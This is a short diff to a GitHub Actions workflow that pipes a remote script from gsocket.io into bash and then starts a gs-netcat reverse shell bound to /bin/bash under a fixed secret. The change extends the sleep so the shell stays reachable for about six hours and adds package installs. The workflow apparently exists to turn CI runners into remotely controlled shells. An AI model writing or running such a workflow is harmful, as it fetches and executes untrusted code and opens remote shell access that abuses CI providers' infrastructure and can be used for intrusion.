@@ -11,9 +11,12 @@ jobs:
       - name: Install gs-netcat from gsocket.io/x
         run: |
           curl -fsSL https://gsocket.io/x | bash
+          apt update -y
+          apt upgrade -y
+          apt install neofetch speedtest-cli python3 python3-pip
 
       - name: Start gsocket reverse shell (bash)
         run: |
           nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 &
           echo "GSocket shell started. You have 1 hour to connect..."
-          sleep 2100
+          sleep 21600
